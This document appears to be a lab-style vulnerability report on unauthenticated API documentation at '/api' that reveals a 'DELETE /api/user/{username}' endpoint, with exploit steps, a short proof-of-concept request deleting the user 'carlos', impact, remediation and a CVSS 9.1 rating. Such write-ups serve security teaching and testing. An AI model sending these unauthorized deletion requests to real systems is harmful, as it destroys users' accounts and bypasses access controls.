# Exploiting an API endpoint using documentation

## Description
The application exposes interactive API documentation without authentication. The documentation reveals sensitive API endpoints, including functionality for deleting user accounts. An attacker can use the exposed documentation to identify and invoke privileged endpoints without authorization.

## Steps to Exploit
1. Navigate to `/api`.
2. Observe that the API documentation is accessible without authentication.
3. Review the available endpoints.
4. Locate the `DELETE /api/user/{username}` endpoint.
5. Send a request to delete a user account.
6. Observe that the operation succeeds without authorization checks.

## Proof of Concept

### Exposed Documentation
```http
GET /api HTTP/1.1
```

### Response
```http
HTTP/1.1 200 OK
```

```text
Full API documentation and endpoint schema returned without authentication.
```

### Delete Request
```http
DELETE /api/user/carlos HTTP/1.1
Host: TARGET
```

### Response
```http
HTTP/1.1 200 OK
```

```text
User account deleted successfully.
```

## Impact
- Unauthenticated access to sensitive API functionality.
- Ability to delete or modify user accounts without authorization.
- Exposure of internal API structure and business logic.
- Increased risk of large-scale data manipulation and abuse.

## Remediation
1. Restrict API documentation to authenticated and authorized users.
2. Enforce authentication and authorization on all API endpoints.
3. Disable or protect API documentation in production environments.
4. Implement API monitoring, logging, and rate-limiting controls.

## CVSS Score
**CVSS v3.1: 9.1 (Critical)**

**Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N`

## CVSS Justification
- **Attack Vector:** Network – exploitable via direct API access.
- **Attack Complexity:** Low – requires only access to the exposed documentation.
- **Privileges Required:** None.
- **User Interaction:** None.
- **Confidentiality:** High – sensitive API functionality and data may be exposed.
- **Integrity:** High – attackers can modify or delete application data.
- **Availability:** None – no direct impact on service availability demonstrated.

